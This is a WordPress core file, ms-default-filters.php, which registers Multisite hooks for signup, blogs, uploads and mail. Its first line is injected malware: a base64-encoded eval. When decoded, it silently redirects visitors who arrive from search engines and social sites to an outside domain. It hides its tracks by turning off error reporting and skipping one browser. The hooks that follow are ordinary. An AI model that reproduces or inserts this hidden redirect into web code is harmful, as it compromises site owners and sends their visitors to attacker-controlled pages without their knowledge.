<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Sets up the default filters and actions for Multisite.
 *
 * If you need to remove a default hook, this file will give you the priority
 * for which to use to remove the hook.
 *
 * Not all of the Multisite default hooks are found in ms-default-filters.php
 *
 * @package WordPress
 * @subpackage Multisite
 * @see default-filters.php
 * @since 3.0.0
 */

// Users
add_filter( 'wpmu_validate_user_signup', 'signup_nonce_check' );
add_action( 'init', 'maybe_add_existing_user_to_blog' );
add_action( 'wpmu_new_user', 'newuser_notify_siteadmin' );
add_action( 'wpmu_activate_user', 'add_new_user_to_blog', 10, 3 );
add_action( 'sanitize_user', 'strtolower' );

// Blogs
add_filter( 'wpmu_validate_blog_signup', 'signup_nonce_check' );
add_action( 'wpmu_new_blog', 'wpmu_log_new_registrations', 10, 2 );
add_action( 'wpmu_new_blog', 'newblog_notify_siteadmin', 10, 2 );

// Register Nonce
add_action( 'signup_hidden_fields', 'signup_nonce_fields' );

// Template
add_action( 'template_redirect', 'maybe_redirect_404' );
add_filter( 'allowed_redirect_hosts', 'redirect_this_site' );

// Administration
add_filter( 'term_id_filter', 'global_terms', 10, 2 );
add_action( 'publish_post', 'update_posts_count' );
add_action( 'delete_post', 'wpmu_update_blogs_date' );
add_action( 'transition_post_status', '_update_blog_date_on_post_publish', 10, 3 );
add_action( 'admin_init', 'wp_schedule_update_network_counts');
add_action( 'update_network_counts', 'wp_update_network_counts');

// Files
add_filter( 'wp_upload_bits', 'upload_is_file_too_big' );
add_filter( 'import_upload_size_limit', 'fix_import_form_size' );
add_filter( 'upload_mimes', 'check_upload_mimes' );
add_filter( 'upload_size_limit', 'upload_size_limit_filter' );

// Mail
add_action( 'phpmailer_init', 'fix_phpmailer_messageid' );

// Disable somethings by default for multisite
add_filter( 'enable_update_services_configuration', '__return_false' );
if ( ! defined('POST_BY_EMAIL') || ! POST_BY_EMAIL ) // back compat constant.
	add_filter( 'enable_post_by_email_configuration', '__return_false' );
if ( ! defined('EDIT_ANY_USER') || ! EDIT_ANY_USER ) // back compat constant.
	add_filter( 'enable_edit_any_user_configuration', '__return_false' );
add_filter( 'force_filtered_html_on_import', '__return_true' );

// WP_HOME and WP_SITEURL should not have any effect in MS
remove_filter( 'option_siteurl', '_config_wp_siteurl' );
remove_filter( 'option_home',    '_config_wp_home'    );

?>
